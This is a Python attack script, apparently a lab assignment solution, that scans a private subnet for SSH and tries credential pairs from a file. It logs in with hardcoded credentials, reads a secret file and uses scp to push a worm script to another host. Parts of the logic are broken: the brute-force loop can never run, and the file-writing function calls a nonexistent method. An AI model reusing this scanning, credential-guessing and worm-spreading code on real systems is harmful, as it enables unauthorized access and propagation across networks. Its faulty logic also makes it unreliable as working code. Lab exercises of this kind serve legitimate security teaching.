import paramiko
import logging
import time

# approval codes: BLEVXZ, J5G0KN
def attack_network_machine():
    incomplete_ip = "172.16.48."
    port = 22  # SSH port
    timeout = 2
    potential_ips = []
    #targeted_ips = []
    targeted_ips = ['172.16.48.8', '172.16.48.9', '172.16.48.19','172.16.48.20', '172.16.48.24', '172.16.48.88', '172.16.48.102', '172.16.48.163', '172.16.48.240']
    read_directory = "ls && echo 'DONE'\n"
    retrieve_secret = "cat Q2secret && echo 'DONE'\n"
    write_to_vuln_vm = "scp /Lab2/Solutions/Q2worm.py cse@172.16.49.55:~"
   
    # Create list of all potential IPs
    for i in range(9):
        potential_ips.append(incomplete_ip + str(i))


    # Code below only used once to find initial target IPs, so don't
    if not targeted_ips:
        # Find to-be-targeted IPs
        for ip in potential_ips:
                if attempt_ssh(ip, port, timeout):
                    print(f"SSH is available on {ip}")
                    targeted_ips.append(ip)
                else:
                    print(f"SSH is not available on {ip}")


    # Test usernames and passwords against targeted IPs
    usernames = []
    passwords = []
    with open("Q2pwd") as login_info:
        for line in login_info:
            username, password = line.strip().split(" ")
            usernames.append(username)
            passwords.append(password)


    # only run code below once. code below is the result of a working login.
    if not targeted_ips:
        for ip in targeted_ips:
            for username, password in zip(usernames, passwords):
                attempt_login(ip, port, username, password, retrieve_secret)


    # retrieves secret using cat command
    attempt_login("172.16.48.88", port, "UQidpD", "herpderp", retrieve_secret)
    # writes Q2worm.py to vulenerable vm
    attempt_login("172.16.48.88", port, "UQidpD", "herpderp", write_to_vuln_vm)
    # reads directory after adding worm
    attempt_login("172.16.48.88", port, "UQidpD", "herpderp", read_directory)



logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
def attempt_ssh(ip, port, timeout):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, timeout=timeout)
        ssh.close()
        return True
    except paramiko.AuthenticationException as e:
        logging.error(f"SSH authentication failed for {ip}: {e}")
    except paramiko.SSHException as e:
        logging.error(f"SSH connection error for {ip}: {e}")
    except Exception as e:
        logging.error(f"An error occurred while connecting to {ip}: {e}")
    return False


def attempt_login(ip, port, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=2)
       
        # Execute the command on the remote machine
        stdin, stdout, stderr = ssh.exec_command(command)
       
        # Read and print the command output
        output = stdout.read().decode('utf-8')
        print(f"Connected to {ip}, User: {username}, Password: {password}")
        print("Command output:")
        print(output)
        ssh.close()
    except paramiko.AuthenticationException:
        print(f"Login failed: {ip}, User: {username}, Password: {password}\n")
    except Exception as e:
        print(f"Error connecting to {ip}\n")


        output_file(output)


def output_file(output):
    with open("Q2secrets", "w") as secret_file:
        secret_file.append(output)


if __name__ == "__main__":
    attack_network_machine()
